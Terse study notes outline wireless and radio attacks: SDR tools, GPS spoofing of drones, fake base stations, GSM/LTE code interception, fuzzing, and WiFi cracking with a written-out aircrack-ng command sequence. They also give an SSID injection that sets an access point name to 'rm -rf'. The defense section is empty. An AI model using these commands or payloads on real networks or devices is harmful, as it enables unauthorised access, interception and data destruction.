

## 电视棒

信号接收

## VGA

信号发射 low costs

## HackRF

crack by replay

## BladeRF

fabricate GPS signal

GPS欺骗实现劫持无人机：hack修正坐标

## Universal Radio Hacker

# attacks

## SCA

hijack screen

## 伪基站

hijack IOT, OpenBTS USRP

## 2G/3G GSM message hijack

## 4G hijack telephone

hijack verify code

## LTE MITM

# WiFi

## crack password

`iwconfig/ifconfig`

`airmon-ng start [wlan0 name]`: start monitor

`airmon-ng check kill`: kill some interfere things

`airodump-ng mon0`

`airodump-ng --bssid [MAC addr of AP] -c [信道] -w out mon0`

`aircrack-ng xxx.cap`

`aircrack-ng xxx.cap -w passwords.txt`

## fake ap

### arp & DNS hijack

### WPA-Radius

wireshark hijack

## ProbeRequest SSID

leak location

## 802.11

### fuzz

peach fuzzer

fuzz 任意网卡

### wifuzz

`python wifuzz.py`

`-s [ssid(MAC)] -i mon0 any/probe`

`scapy error`

`wireply.py -i wlan1mon -s [ssid] xxx.pcap`

## WiFi positioning spoof

some apps use WiFi MAC to locate accurately, which can be spoofed

## SSID injection

xss

`iwconfig wlan1mon channel 1`: change channel

`airbase-ng -e "rm -rf" -c [channel] `

## defense

